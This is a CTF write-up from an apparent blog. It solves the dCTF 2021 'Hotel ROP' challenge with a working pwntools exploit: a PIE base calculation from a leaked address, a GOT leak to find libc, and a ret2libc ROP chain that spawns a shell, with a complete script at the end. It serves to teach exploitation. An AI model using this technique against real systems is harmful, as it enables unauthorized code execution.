---
title: "dCTF 2021 - Hotel ROP"
date: 2021-05-24T20:22:21-05:00
draft: false
subtitle: "Returning 2 LIBC in a PIE enabled binary"
tags: ["pie", "aslr", "easy", "elf", "libc"]
author: "<a href='https://caprinux.github.io'>elma</a>"
---
Today, we will be looking at a pwn challenge from **dCTF 2021** which features ret2libc exploitation with a little twist of a `PIE-enabled` binary. The following PwnTools features will be introduced here:
- **[pwnlib.rop](https://docs.pwntools.com/en/stable/rop/rop.html)** to help us craft ROP chains
- **[pwnlib.elf](https://docs.pwntools.com/en/stable/elf.html)** to make finding addresses quick and easy
- and many more little modules from `pwntools` to help us pwn faster ~

<br>

## Challenge Description
---
> They say programmers' dream is California. And because they need somewhere to stay, we've built a hotel!
>
> Attachments: [hotel_rop](/files/hotel_rop)


<br>

## Getting Started
---

For this challenge, we are provided with a binary and nothing else.

We quickly check the security features of the binary with `pwn checksec hotel_rop` which returns

{{< rawhtml >}}
<pre>
[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#5c5cff;">*</span>] &apos;/media/sf_dabian/Challenges/dctf/pwn/hotel_rop&apos;
    Arch:     amd64-64-little
    RELRO:    <span style="color:#cdcd00;">Partial RELRO</span>
    Stack:    <span style="color:#cd0000;">No canary found</span>
    NX:       <span style="color:#00cd00;">NX enabled</span>
    PIE:      <span style="color:#00cd00;">PIE enabled</span>
</pre>
{{< /rawhtml >}}

As shown, `PIE` and `NX` is enabled. Let's run the binary and check out what we are dealing with

```
➜ ./hotel_rop
Welcome to Hotel ROP, on main street 0x55e4cd29636d
You come here often?
test
I think you should come here more often.
```

As you can see, we are given a leak and an input. Let's decompile and look at what's going on behind the scenes.

```c
int main()
{
  alarm(0xAu);
  printf("Welcome to Hotel ROP, on main street %p\n", main);
  vuln();
  return 0;
}

int vuln()
{
  int result;
  char s[28];
  int v2;

  puts("You come here often?");
  fgets(s, 256, stdin);
  if ( v2 )
    result = puts("I think you should come here more often.");
  else
    result = puts("Oh! You are already a regular visitor!");
  return result;
}

```

As you can see, we have a leak which points to `main()`, and we have a **buffer overflow** in `vuln()` as we are given **256 bytes of input** into a variable that holds **28 bytes of data**.

With this, it becomes rather apparent that we have to do a `ret2libc` in order to spawn a shell and win. However, since this binary is `PIE` enabled, we have to first calculate the `PIE` base.

<br>

## Exploitation
---

### Stage 1: Calculate PIE base

Since we know that our leak is the address of `main()`, we can easily calculate our offset with `elf.sym.main` and set it as the base_address by saving it to `elf.address`.

```py
from pwn import *

context.binary = elf = ELF('hotel_rop')
p = process('./hotel_rop')
libc = elf.libc # set libc

#: RECEIVE LEAK CALCULATE PIE BASE
p.recvuntil(b'main street ')
mainleak = int(p.recvline().rstrip(b'\n'), 16)
# use elf to save find main address and save PIE base into elf.address
elf.address = mainleak - elf.sym.main

log.info(f'pie base @ {hex(elf.address)}')
```

OUTPUT:

{{< rawhtml >}}
<pre>
[<span style="color:#cd00cd;">x</span>] Starting local process &apos;./hotel_rop&apos;
[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#00ff00;">+</span>] Starting local process &apos;./hotel_rop&apos;: pid 19494
[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#5c5cff;">*</span>] Stopped process &apos;./hotel_rop&apos; (pid 19494)
[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#5c5cff;">*</span>] pie base &#64; 0x562e0d3bf000
</pre>
{{< /rawhtml >}}

Running the script, we see that we successfully found PIE base.

### Stage 2: Leak and calculate LIBC base

Since LIBC is ASLR-enabled, we also have to calculate the LIBC base. This means we will need a LIBC leak and we will do that in our `rop.chain()`.

We will leak an address from the `GOT` which contains libc addresses, and from there, calculate our libc base address.

Let's write our `rop.chain()`, but without having to find any gadgets or addresses ourselves!!

```py



#: LEAK PUTS GOT  

# create rop chain
rop1 = ROP(elf)
rop1.puts(elf.got.puts)
rop1.main()
log.info(rop1.dump())
# send rop chain with auto 40 bytes cyclic padding
p.sendline(flat({ 40: rop1.chain()}))
p.recvuntil(b'often.\n')

#: CALCULATE LIBC BASE FIND BINSH
putsgotleak = u64(p.recvline().strip(b'\n').ljust(8, b'\x00'))
libc.address = putsgotleak - libc.sym.puts

log.success(f'libc base @ {hex(libc.address)}')


```

OUTPUT:

{{< rawhtml >}}
<pre>

[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#00ff00;">+</span>] Starting local process &apos;./hotel_rop&apos;: pid 19878
[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#5c5cff;">*</span>] pie base &#64; 0x562942b04000
[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#5c5cff;">*</span>] Loaded 14 cached gadgets for &apos;hotel_rop&apos;

[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#5c5cff;">*</span>] 0x0000:   0x562942b0540b pop rdi; ret
    0x0008:   0x562942b08018 [arg0] rdi = got.puts
    0x0010:   0x562942b05030 puts
    0x0018:   0x562942b0536d main()

[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#00ff00;">+</span>] libc base &#64; 0x7f9950b69000
[<span style="font-weight:bold;color:#7f7f7f;"></span><span style="font-weight:bold;color:#5c5cff;">*</span>] Stopped process &apos;./hotel_rop&apos; (pid 19878)

</pre>
{{< /rawhtml >}}

Success! Let's proceed with the last part of our exploit.

### Stage 3: Return 2 LIBC System!

Now we have all the pieces we need to return to libc. This is super simple with pwntools as well, we simply need to look for our '/bin/sh' string with `libc.search()` and call `rop.system(binsh)`.

```py
# locates binsh string from libc
binsh = next(libc.search(b'/bin/sh'))

#: POP SHELL
rop2 = ROP([libc, elf])
rop2.system(binsh)
p.sendline(flat({40: rop2.chain()}))
log.success(f'Enjoy your shell!')

p.clean()
p.interactive() # win!
```

OUTPUT:

```
[*] 0x0000:   0x7f337c437796 pop rdi; ret
    0x0008:   0x7f337c59b156 [arg0] rdi = 139859106312534
    0x0010:   0x7f337c459e50 system
[+] Enjoy your shell!
[*] Switching to interactive mode

$ id
uid=0(root) gid=0(root) groups=0(root)

$ whoami
root
```

With that, we successfully popped a shell and pwned the binary!

---

#### Clean Script

```py
from pwn import *

p = process('./hotel_rop')
context.binary = elf = ELF('hotel_rop')
libc = elf.libc

#: RECEIVE LEAK CALCULATE PIE BASE
p.recvuntil(b'main street ')
mainleak = int(p.recvline().rstrip(b'\n'), 16)
elf.address = mainleak - elf.sym.main


#: LEAK PUTS GOT  
rop1 = ROP(elf)
rop1.puts(elf.got.puts)
rop1.main()
p.sendline(flat({ 40: rop1.chain()}))
p.recvuntil(b'often.\n')

#: CALCULATE LIBC BASE FIND BINSH
putsgotleak = u64(p.recvline().strip(b'\n').ljust(8, b'\x00'))
libc.address = putsgotleak - libc.sym.puts
binsh = next(libc.search(b'/bin/sh'))

#: POP SHELL
rop2 = ROP([libc, elf])
rop2.system(binsh)
p.sendline(flat({40: rop2.chain()}))
log.success(f'Enjoy your shell!')

p.clean()
p.interactive()
```

---

This post was contributed by Elma. Check him out on his [blog](https://caprinux.github.io)!
